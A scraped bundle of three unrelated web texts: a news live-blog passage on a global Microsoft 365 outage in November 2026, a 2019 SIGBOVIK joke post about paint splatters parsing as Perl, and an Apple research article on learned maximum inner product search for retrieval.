tools and other staples of modern office life , as well as the company’s Copilot AI chatbot. Yui Mok/PA/AP Outlook is returning to normal after hours of disruption, as queues of email waiting to be delivered are “significantly reduced and approaching normal levels,” Microsoft said. The company is continuing to observe “improvements in service availability,” it said in a statement this morning. “Some users may still experience intermittent access issues or delayed email delivery as recovery continues,” it added. Yui Mok/PA/AP Microsoft just said it is seeing “encouraging recovery progress” at the same time as some social media users and CNN journalists report receiving emails in their inboxes again. In a statement on X , the company reported “email delivery performance improving across a growing portion of affected Microsoft 365 infrastructure,” but warned some users may still “experience intermittent issues.” While some social media users reported getting emails again, others said they were still unable to access them. In an additional update issued later, Microsoft outlined the uneven pace of recovery in different regions. The company indicated that North America was recovering faster than Europe and Asia. It reported “broader improvements in North America, sustained improvements across much of Europe, and encouraging recovery signals in Asia Pacific.” Read more Updated Nov 13, 2026, 6:57 AM ET Published Nov 13, 2026, 6:57 AM ET Link Copied! Herts Police/X Several UK police forces told the public Friday to report crimes or issues by telephone rather than through their websites amid the Microsoft outage. Police forces in Merseyside, Greater Manchester and Bedfordshire informed visitors to their websites that online submission forms were disrupted. East Hertfordshire Police said in a statement posted to X that “some online form submissions on our website may be affected” because of the outage. In another Friday post on X, Dorset Police said it was “unable to receive online form submissions.” All police forces urged the public to call 101 if their issue is “time-critical but not an emergency.” (The UK emergency number is 999). Microsoft says services are being "gradually restored" By Issy Ronald Microsoft says it is making “additional progress toward recovery” and that traffic is “being gradually restored” as its engineers scramble to fix the worldwide outage that has left millions without the work tools they use every day. In a statement, Microsoft said it is “seeing improvements in key scenarios, including mailbox access and delayed email processing, though some intermittent issues may continue.” Read more Updated Nov 13, 2026, 6:33 AM ET Updated Nov 13, 2026, 6:33 AM ET Published Nov 13, 2026, 6:06 AM ET Link Copied! What to know as you're waking up in the US without email By Hanna Ziady and Karina Tsui Applications such as Outlook and Teams are unavailable or have limited availability due to the outage. ANP/Shutterstock/Shutterstock Outlook is still down, as Microsoft’s rolling outage – now extending into a second day – continues to affect services for millions of people around the world. The outage, which is also affecting Teams and Copilot, is disrupting government and business operations in the United States and elsewhere, with at least one company postponing a quarterly earnings call. Microsoft executive Charles Lamanna said in the early hours of Friday that there is currently no indication that the outage is the result “of malicious or cyber activity.” Here’s what to know: Email down : Outlook remains down and users are also having trouble accessing their Exchange Online mailboxes. In an update at around 4:15 a.m. ET Friday, Microsoft said it would extend its “email timeout window” to 48 hours “to help protect delayed messages while service recovery continues.” The email timeout window is the maximum amount of time that a mail server or email client such as Outlook will spend waiting to receive an email before returning an error. AI companies affected: OpenAI said it was facing issues with Microsoft connectors, with some tools, including ChatGPT, not working “as expected.” Meanwhile, thousands of Claude AI users reported issues Friday morning, according to Downdetector . Claude creator Anthropic said shortly after 6 a.m. ET that a fix had been deployed and it was “monitoring for recovery.” US lawmakers: The US House of Representatives said the outage impacted its users and its engineers were working with Microsoft, according to Reuters . Some congressional staffers expressed frustration on X. “Shall we start conducting all official business via DM?” said Sharon Eliza Nichols, communications director for Congresswoman Eleanor Holmes Norton. US cities: City governments across the United States have reported email disruptions and have encouraged residents to call local offices and agencies if necessary. Several police and sheriff departments said the outage was affecting their email and communication platforms, including Colorado’s Arapahoe Sheriff’s Office , which said the outage had delayed the processing of prisoners’ bail payments. The outages are affecting email services in Miami Beach, Austin, and Jacksonville, though officials assured residents that emergency services were still active. In California, officials from Pasadena, Fremont, Burbank, and Santa Barbara also issued statements warning of downed email use. Baltimore County officials said on X that government staff could not send or receive emails and urged residents to contact relevant departments by phone. Earnings call delayed: Workhorse Group, a Detroit-based electric vehicle manufacturer, pushed its third quarter earnings call to Monday , citing “business disruptions caused by the global Microsoft outages.” CNN’s Gage Goulding contributed reporting. Read more Updated Nov 13, 2026, 6:26 AM ET Published Nov 13, 2026, 6:26 AM ET Link Copied! What is affected by the outage? By Issy Ronald A woman trying to access her Microsoft Hotmail email inbox on a phone in London on Friday. Yui Mok/PA/AP Some office workers rely on Microsoft’s suite of applications for practically everything – emails, meetings, AI, creating spreadsheets, and writing and sharing documents. Any of those functions which involve email or Microsoft’s Exchange Online services are impacted, the company said. Outlook: Email is the main thing impacted by the outage, leaving users likely unable to access or send any new emails. Copilot: Users may also be unable to load chats with or receive responses from Microsoft’s AI tool. Copilot also cannot access the data it normally draws from, like emails, files and calendars. Teams: Anything that has already been scheduled and requires Teams — Microsoft’s communications platform — to connect with a user’s calendar is likely impacted. But if users are simply just joining a call or exchanging messages, that is still working. Word/Excel/Powerpoint: The basic functions of these apps are still working. However, other functions may be impacted, like if users are trying to print documents over the cloud or share documents with Sharepoint. Users may also not be able to view their most recently used files. Other, more specialist Microsoft services – like those which pool a company’s data or allow IT to monitor a company’s devices – may also be affected. Read more Updated Nov 13, 2026, 5:25 AM ET Published Nov 13, 2026, 5:25 AM ET Link Copied! It's a disappointing day for some workers using Gmail By Anna Cooban Gmail users report the app to be working. Jaque Silva/NurPhoto/Getty Images While many workers using Microsoft’s systems have spent Friday rejoicing that they’re forced to take a break — unable to send or receive emails or conduct their usual Teams calls — those using Google services are lamenting in memes shared on social media. Google systems including Gmail, Google Docs and Google Meet appear to be functioning just fine, or at least well enough to promise users an average working Friday. One video on Instagram shows someone lying in bed with the word “Outlook” above their head. Another sits at a desk working on their laptop with the word “Gmail” above theirs. Another video shows a meme of actor Pedro Pascal appearing to sob uncontrollably under text reading: “When you hear Outlook is down and start planning your afternoon wines… Then remember your workplace uses Google Workspace.” Read more Updated Nov 13, 2026, 5:16 AM ET Published Nov 13, 2026, 5:16 AM ET Link Copied! Railways report communications delay due to Microsoft service disruption By Gage Goulding and Hanna Ziady Germany’s Deutsche Bahn said the Microsoft outage is causing significant delays across their internal communications. Stefan Sauer/picture-alliance/dpa/AP Some railway networks are experiencing disruptions to their customer email services and routing schedules because of the Microsoft outage. VIA Rail Canada said passengers “ may not be able to receive email communications about their trip” due to technical issues with Microsoft services. The railway asked passengers to check their web-based train tracker or subscribe to SMS notifications for information on their journeys. Germany’s Deutsche Bahn said Microsoft Outlook is experiencing “severe sluggishness,” causing significant delays in its abilities to send out and receive emails. “As a result, the distribution of rerouting schedules is severely restricted. All relevant teams are involved in resolving the issue; current indications point to a server-side problem on Microsoft’s end,” it said in a statement. In the UK, National Rail , which runs passenger rail services in England, Scotland and Wales, said the ongoing outage may be affecting customers’ ability to access train tickets by email. It advised travelers to visit the website or app where tickets were purchased, or to contact the ticket retailer directly. “If you are still unable to access your ticket, please contact a member of onboard staff or station staff for advice,” National Rail said on its website . Rail Delivery Group, which manages National Rail, said there were no current disruptions to operations or train services as a result of the outage. CNN’s Nina Avramova contributed to this report. Read more Updated Nov 13, 2026, 5:07 AM ET Published Nov 13, 2026, 5:07 AM ET Link Copied! Microsoft extends email timeout window to 48 hours amid outage By Karina Tsui Microsoft said that it would extend its email timeout window to 48 hours “to help protect delayed messages while service recovery continues,” according to an update posted at around 4:15 a.m. ET Friday. The email timeout window is the maximum amount of time that a mail server or email client such as Outlook will spend waiting to receive an email before returning an error. Microsoft said recovery efforts are ongoing and that it’s seeing “early signs of stabilization,” though service capacity has not returned to normal. Read more Updated Nov 13, 2026, 5:17 AM ET Updated Nov 13, 2026, 5:17 AM ET Published Nov 13, 2026, 1:30 AM ET Link Copied! It's Friday and Microsoft is still down. Kirsty Wigglesworth/AP Memes and jokes abounded online as the global outage of Microsoft’s Outlook emails and Teams meeting platform crossed the 12-hour mark. One joke that spread on Threads , X and LinkedIn was the rebrand of Microsoft365 to Microsoft364 – memorializing the one day of the year that the software company went dark. Others reveled at not needing to respond to constant emails and notifications for at least one day. A user on X said : “whoever is troubleshooting and working on the Microsoft outage for outlook and teams…. take your time.” Another account wrote : “Outlook is down. Your email does not find me well. It does not find me at all.” Others on Reddit said they panicked and thought they were laid off when they could not access their work emails. Read more Updated Nov 13, 2026, 5:17 AM ET Updated Nov 13, 2026, 5:17 AM ET Published Nov 13, 2026, 12:30 AM ET Link Copied! Here's where we're seeing the outage's impacts By Kathleen Magramo This photo taken on Friday shows an error screen for Microsoft's Outlook email service and its app icon after a widespread outage hit the company's platforms. Kyodo News/Getty Images At first, Microsoft said the connection issues were happening “in the Americas,” but over time it became clear the troubles were global. Microsoft’s outage reports “reached 74 countries and territories in about an hour,” according to Downdetector, a website that tracks cyber outages. “Reports did not stay in the Americas. They jumped tenfold in the UK at 17:43 (12:43 PM ET) , in India at 23:21 local time and in New Zealand at 06:55 local time. Between 17:00 and 18:55 UTC, nearly 3 in 10 reports came from outside the US,” Downdetector wrote on X . Here’s where we’ve seen reports of outages: Australian schools, courts and government services started their Friday morning with Microsoft Outlook and other apps out of service. In Hong Kong , workers from banks including Morgan Stanley and Goldman Sachs told CNN their work was disrupted, as they were unable to access emails or Teams from the moment they signed on and all through their lunch break. “Sporadically some mails come in but there is probably millions of backlog to process,” one banker told CNN before heading off for lunch break. The disruption has also hit Japan ’s government services, Deputy Chief Cabinet Secretary Masanao Ozaki said in a Friday presser. Government employees are responding to the outage by creating physical copies of documents, he added. Government ministries and agencies have been unable to send emails through most of the Friday workday. Courts in the Philippines are also being slowed down by the Microsoft disruption, the Supreme Court said. “During this period, responses to emails and other transactions may be delayed,” it added in a post on X. In the UK , a disruption to the National Health Service email system is expected to prevent some patients from getting their drug prescriptions. The outage “affects a pharmacy’s ability to communicate with GP practices and some patients,” a spokesperson for the National Pharmacy Association said in a Friday statement. GPs are equivalent to family doctors in the US. An NPA spokesperson told CNN in a separate phone call that, while many patients will get their medications, those with more complex prescriptions requiring a pharmacist to contact the prescribing doctor to check or query any details could experience delays. The spokesperson added that Fridays are typically busy days at pharmacies. “It’s just a massive pain. It will be slow today,” they said. Around 30 minutes later, Microsoft posted another statement saying the company has seen “positive results for service stability and increased capacity as a result of our latest traffic optimization actions.” Reiterating what it said earlier Thursday, Microsoft stated it was not aware of any malicious activity causing the outage but will continue to treat the incident “with urgency and priority until full resolution.” “Once mitigated, we will provide full details of the root cause, defense-in-depth repair items, and more within a Post-Incident Report.” Read more Updated Nov 13, 2026, 2:57 AM ET Published Nov 13, 2026, 2:57 AM ET Link Copied! More than 12 hours into Microsoft's outage, here's what to know By Laura Sharman The Microsoft global outage is ongoing after the US tech giant first reported problems with its email services on Thursday. More than 430 million people use Microsoft 365 apps and more than 90% of Fortune 500 companies use its Copilot AI chatbot, according to the company’s website. Millions worldwide lost access to Outlook email, Teams meeting tools and other essentials of modern office life as the disruption quickly spread . The company reported “marginal success” in repairing the outage in its latest update, early Friday ET. A Microsoft executive confirmed the outage was not the result of a security breach. As Europe woke on Friday, the outage remained widespread. Here’s the latest if you’re just tuning in: Return to sender: The outage hit in 74 countries and territories in around an hour, according to tracking website Downdetector. Several airlines reported disruptions to their email support. In the US : City governments countrywide reported widespread email disruptions and encouraged residents to call local offices and agencies if necessary. At least one American company postponed its quarterly earnings call. In Asia Pacific: Some of Japan’s government services switched to paper documents due to the outage and courts in the Philippines experienced delays. Australian schools, courts and government services were also affected. In Hong Kong, staff at Morgan Stanley and Goldman Sachs told CNN their work was disrupted through to their lunch break. Scams warning : Banks warned customers to beware of scams and phishing attempts as cybercriminals may use the outage to target individuals and businesses. title: 93% of paint splatters are valid Perl programs (2019)
body_text: 93% of Paint Splatters are Valid Perl Programs | Colin McMillen Colin McMillen 93% of Paint Splatters are Valid Perl Programs Posted 2019-04-01. TLDR: read the paper and view the gallery of pretty Perl programs . In this paper, we aim to answer a long-standing open problem in the programming languages community: is it possible to smear paint on the wall without creating valid Perl? We answer this question in the affirmative: it is possible to smear paint on the wall without creating a valid Perl program. We employ an empirical approach, using optical character recognition (OCR) software, which finds that merely 93% of paint splatters parse as valid Perl. We analyze the properties of paint-splatter Perl programs, and present seven examples of paint splatters which are not valid Perl programs. Accepted for publication at SIGBOVIK 2019, held April 1st 2019 in Pittsburgh. Winner of a Unwitting Participation Ribbon, “an unwelcome brand weâve affixed to each paper determined after careful scrutiny to have included a genuine artifact, thereby furthering the admirable causes of open science and fruitful procrastination.” Read it on Google Docs or download a PDF . Or grab the entire SIGBOVIK 2019 proceedings ; I’m on page 174. Supplementary Materials Here’s all the paint splatters on a single page, along with the valid Perl source code corresponding to each. “Not valid” is written in red for those images which did not parse as valid Perl programs. If different OCR settings recognized multiple valid Perl programs, I chose the one that seemed the most “interesting”, according to my own aesthetic sense. Here’s a tarball of 100 paint-splatter images that were used as the main dataset for this paper. (source code not available yet because i am bad at GitHub) Errata There are a few paint splatter Perl programs that I didn’t recognize as “interesting” until after the SIGBOVIK submission deadline. For example, this splatter is recognized by OCR as the string lerzfijglpFiji-j , which evaluates to the number 0 in Perl: The image below is recognized as the string -*? , which also evaluates to the number 0 in Perl: Another surprising program is shown below; OCR recognizes this image as the string ;i;c;;#\\?z{;?;;fn':.; , which evaluates to the string c in Perl: Finally, this image is recognized as the string ;E,'__' , which evaluates to the string E__ in Perl: © 2023 Colin McMillen . title: Faster Retrieval for Better, More Efficient RAG
body_text: Faster Retrieval for Better, More Efficient RAG - Apple Machine Learning Research Machine Learning Research Open Menu Close Menu Overview Research Highlights Publications Events Work with us content type highlight published November 5, 2026 Faster Retrieval for Better, More Efficient RAG Maximum inner product search (MIPS) sits at the core of recommendation systems, search, and retrieval-augmented generation (RAG). Given a query vector, MIPS systems search within a database of millions of candidate key vectors for the one that best matches the query. The original data point associated with that best-matching key is then used to handle the query: in RAG, the document that is best suited to answer the question is typically prefixed to the query. As the number of keys grows to millions and vector dimensions reach thousands, the computational cost of running an exhaustive comparison of the query to all keys grows dramatically. Numerous approximate methods have been proposed to trade off accuracy for speed using clustering and quantization. While these baseline methods focus on the properties of the set of keys to build up clever indexing structures, their geometric arguments loosely assume that the set of queries itself will resemble that found in keys, or bypass any considerations about what the queries will look like. This can be problematic on two fronts: In the crucial RAG case, queries arise from short user-generated questions, whereas keys represent long, informative, and curated pieces of text, making keys and queries substantially different. Additionally, most MIPS use cases deployed in production target an existing base of users with a stable, well-characterized query distribution â a signal that generic, query-agnostic methods leave untapped. Crafting methods that work best for a likely source of inputs â rather than aiming for good performance on all possible inputs â is a central tenet of modern machine learning that helps redirect compute resources more efficiently. In Amortizing Maximum Inner Product Search with Learned Support Functions , a paper presented at ICML 2026, researchers from Apple train small neural networks (NNs) â once, offline, for a fixed database of keys â that learn how to route queries toward their best match faster. Their approach trades off an upfront amortization cost to understand how typical queries tend to be matched in exchange for faster, more accurate retrieval at inference time through these small NNs. The Basics of Maximum Inner Product Search A fundamental principle in MIPS is to leverage the geometry of the set of keys to speed up search: Typical MIPS systems split the set of keys into k clusters â k is typically much smaller than the total number of keys n â keeping track of a representative centroid for each cluster. When receiving a new query, the system compares it with these k centroids. The query is then routed toward the cluster of the representative centroid it is closest to, and subsequently compared exhaustively with all keys stored in that cluster. If the database has n keys and k evenly distributed clusters, the effective number of keys that will be considered in that second step is on the order of n / k â a factor-of- k speedup when compared to the n comparisons done in the naive exhaustive approach. Unfortunately, this routing mechanism can result in errors, since centroid routing is not an exact approach, as illustrated in Figure 1 below. Figure 1: Geometric approaches to search can fail and miss nearest neighbors. This is due to their reliance on partitioning the space based on distances to centroids. In the animation, a nearest neighbor is missed as it is not associated with the nearest centroid. MIPS as a Support Function What makes MIPS interesting from a machine learning perspective is that it is built on a mathematical structure that had been largely overlooked before this work: The function that maps a query to the largest inner product with any key in a set is the support function of that set, a well-studied object in convex analysis. This function has two important properties: First, it is convex, so it can be approximated by a class of neural networks specifically designed for convex functions, input convex neural networks (ICNNs) . Second, the gradient of that support function at any query returns the best-matching key itself. The broad idea behind this work is to learn a neural network that can mimic the ground-truth support function (or its gradient directly) for a much lower computational cost. This can be achieved through a classical ML technique known as regression: one simply needs to precompute a large number of training examples formed by sampling input vectors (user queries) and pair them with the relevant output signal produced by MIPS (either the optimal score or the optimal key vector itself). All that is then needed is to train a suitably parameterized neural network to replicate the output given the input. Two Ways to Learn Maximum Inner Product Search If the regression problem were to be solved perfectly, according to the mathematical approach outlined above, the same neural network that is trained to mimic the support function could also output the optimal key by evaluating its gradient (through automatic differentiation). In practice, we observe that training separate, specialized networks for each of these two tasks works best: The SupportNet neural network architecture can learn the support function directly, using a (loosely constrained) ICNN. The approach is mathematically principled and aligns with the convex structure of the problem. We find that this approach can shine when used to compute one support function per data cluster to improve routing quality. KeyNet models learn to directly output the best-matching key vector when fed a query. A consistency loss derived from Eulerâs theorem for homogeneous functions keeps their predictions geometrically grounded in the underlying support function, even though no convexity is explicitly enforced. Both models are trained on examples drawn from the relevant query distribution: for each sampled query, the ground-truth best match is computed once via exhaustive search and stored, creating a supervised dataset that captures the MIPS solution landscape for the distribution of queries that actually matter. Learned Routing with SupportNet As shown in Figure 1 , the simplest way to handle larger scales is to split the keys into clusters, compare the query to each clusterâs centroid, and route the query to the most promising clusters based on these k scores. This provides a cheap yet coarse rule that can be prone to mistakes because a centroid alone cannot account for the spread of its cluster. Indeed, a cluster can hold a key that sits far from its own centroid yet close to the query, and when the query is near such an outlier, centroid routing scores the cluster low and skips it, missing the true best match. If one were given access to the support function of each cluster, then one would instead be able to do exact routing, since each support function quantifies exactly to what extent any key within each cluster can match the query with a large score. This is illustrated in Figure 2 , in which the support function of each of the four clusters is plotted for a query that varies in the space of embeddings. Figure 2: Relying on distances to centroids can be misleading as those distances do not account for every key in each cluster. Given access to each clusterâs support function, assignment can be made based on how well a given query matches any key in a cluster. Leaning on this theoretical insight, we propose to learn these k support functions jointly with a trained SupportNet that can output k scores at once. We can then use the largest of these k scores to route any new query instead. The SupportNet model can answer a more useful question than a simple comparison to the centroid can: âHow good is the best key inside this cluster for this query?â SupportNets are trained in a classic machine learning fashion, also known as regression: we generate sample queries that are drawn from the distribution (typically embeddings for text queries), compute the ground-truth support functions at those queries, and train a neural network to replicate these values. Figure 3: SupportNets approximate the support functions of each cluster and assign queries to clusters based on the best match with any key, not only centroids as typical geometric approaches do. We trained SupportNets of increasing sizes (XS, S, M, and L â 1%, 5%, 10%, and 20% of the database size) on Natural Questions partitioned into 128 clusters. Natural Questions is a retrieval benchmark that pairs general-knowledge questions with passages from a large document database, roughly 2.6M unique passages in our setup. Figure 4 below shows the retrieval performance in terms of recall as a function of different notions of cost. Routing recall is the fraction of queries whose true partition, the one holding the exact best key, lands among those the router chooses to probe. For both plots, an exhaustive search is carried out in the top- s clusters matched with the query, where s grows as powers of two (1, 2, 4, 8, â¦, 128) . Naturally, all methods reach a recall of 1 when they survey all 128 clusters. The first tab shows that for a fixed retrieval performance the learned routers reach it at lower latency than centroid routing. The small SupportNet model hits 95% routing recall about 1.9Ã faster than centroid routing (1.74 ms vs 3.36 ms), and gains are even greater with the large model, which hits 97% in 1.74 ms. This plot explicitly factors in the additional compute incurred by running our small NNs rather than simply comparing to centroids. The plot on the second tab looks exclusively at routing quality, neglecting the overhead incurred by running NNs. At a fixed budget of explored clusters, they find the right partition more often: scanning just 5% of the database, the learned routers recover the true partition ~90â93% of the time â up to 92.6% for the mid-size (M) â versus 87.5% for the centroid baseline. SupportNet Router Size Family Latency (ms/query) Fraction of database scanned Figure 4: Routing performance (recall) due to SupportNets of various sizes versus latency or the fraction of the database we allow the router to scan. Routers, all with a depth of 16 layers, are trained on a 128-cluster Natural Questions dataset. SupportNets dominate the centroid router: given a latency target, one can get a higher recall with a SupportNet or conversely, that recall can be achieved at lower latency by a SupportNet than by a centroid router. Plugging Into Existing Indices SupportNet routing replaces the simple centroid-based routing found in existing inverted file index (IVF) systems. With KeyNet, we can also keep the IVF system as is and just feed it a modified version of the query. In that scenario, KeyNet works naturally as a âquery rewriterâ in front of a standard approximate search index: predict where the best match is likely to be in embedding space, then ask your favorite IVF system to look there instead of starting from the original query. Because the IVF index is highly optimized, it can find the result faster when assisted by KeyNet. We also rely on regression to train KeyNets, as summarized in Figure 5 : sample queries are matched with their ground-truth, best-matching key, and the KeyNet neural network is trained to reproduce that association. Figure 5: KeyNets are trained to map a query to its best match in a database. Combined with an IVF index, pre-processing queries via such a mapping makes search much easier: the resulting transformed query is now much closer to the target it is intended to retrieve. We evaluated KeyNets of increasing sizes (XS, S, M, and L â 1%, 5%, 10%, and 20% of the database size) and in Figure 6 below, we show recallâcost tradeoffs for these different sizes. On the first tab, the search budget is wall-clock latency: reaching 99% recall takes up to ~8Ã less time with the largest model (0.23 ms vs 1.8 ms for the raw query). As before, the second tab focuses exclusively on the boost in âqualityâ provided by replacing the original query with its KeyNet transformation. The x-axis is the fraction of the database the index actually scans: scanning just 0.001% of the database, KeyNet-mapped queries retrieve the true key 89â97% of the time â up to 96.7% for the largest model (L) â versus 86% for the raw query, and reaching 99% recall takes up to ~11Ã fewer keys (0.009% vs 0.10% raw). Better recall for the same cost, or the same recall for a fraction of it. KeyNet Searcher Size Family Latency (ms/query) Fraction of database scanned Figure 6: Search performance (recall) using an IVF index to search a database made from the Natural Questions dataset. The plots compare results due to querying the IVF index directly with raw queries against a search executed after mapping queries with KeyNets of various sizes, all with a fixed depth of 16 layers. Latency in the plots corresponds to the total time required to map a query and search, except for the raw-query case, which accounts only for search. Pre-processing queries with KeyNet is worth it no matter the size: the pre-processing overhead is compensated for by faster search downstream. We show examples obtained from the same Natural Questions dataset discussed previously, served through a FAISS IVF index. It is one of several datasets we studied, and the trend is consistent across them. Querying the index with KeyNetâs predicted key consistently beats querying with the raw question, across the full search-budget sweep. Namely, Figure 7 below shows five Natural Questions examples: top-3 hits for the raw query versus the KeyNet-mapped query. Gallery item 1 Gallery item 2 Gallery item 3 Gallery item 4 Gallery item 5 Figure 7: Top-3 hits for the raw query versus the KeyNet-mapped query: 'What is Matchbox Twenty?' Figure 7: Top-3 hits for the raw query versus the KeyNet-mapped query: 'Who wrote The Eye of the World?' Figure 7: Top-3 hits for the raw query versus the KeyNet-mapped query: 'What is a wind controller used for?' Figure 7: Top-3 hits for the raw query versus the KeyNet-mapped query: 'When will the Summertime Ball be on?' Figure 7: Top-3 hits for the raw query versus the KeyNet-mapped query: 'When was the show Victorious on Nickelodeon?' Which Network Should You Use? The choice between the two ends up being a practical one. Use KeyNet when inference speed is the bottleneck and you just need to approximate the best key. Use SupportNet when you also want a calibrated score (for re-ranking, thresholding, or downstream use), or when compute is tight at small model sizes â a regime where SupportNet stays competitive. Both train similarly, integrate with existing approximate-search infrastructure, and are reasonably robust to mild distribution shift in the query patterns. Ultimately, a very large-scale MIPS system for which the set of keys is huge may require both: train a SupportNet router over all clusters, and then one KeyNet per cluster to help its regular indices zero in on the best key faster. A New Direction for Learned Retrieval Amortized MIPS reflects a shift in how retrieval can be approached when query distributions are known in advance â a common condition in production ML systems. By encoding MIPS solutions directly into network weights, the approach trades a one-time training (so-called amortization ) cost for fast, lightweight inference and opens a practical path toward learned retrieval systems explicitly tailored to the queries they serve. Related readings and updates. Amortizing Maximum Inner Product Search with Learned Support Functions July 2, 2026 research area Knowledge Bases and Search , research area Methods and Algorithms conference ICML Maximum inner product search (MIPS) is a crucial subroutine in machine learning, requiring the identification of a vector taken within a database (the keys) that best aligns with a given query. We propose amortized MIPS: a regression-based approach that trains neural networks to directly predict MIPS solutions, amortizing the cost of repeatedly solving MIPS for queries drawn from a known distribution over a fixed key database. Our key insight isâ¦ Read more Scalable Private Search with Wally October 16, 2024 research area Privacy This paper presents Wally, a private search system that supports efficient semantic and keyword search queries against large databases. When sufficiently many clients are making queries, Wallyâs performance is significantly better than previous systems. In previous private search systems, for each client query, the server must perform at least one expensive cryptographic operation per database entry. As a result, performance degradedâ¦ Read more Discover opportunities in Machine Learning. Our research in machine learning breaks new ground every day.
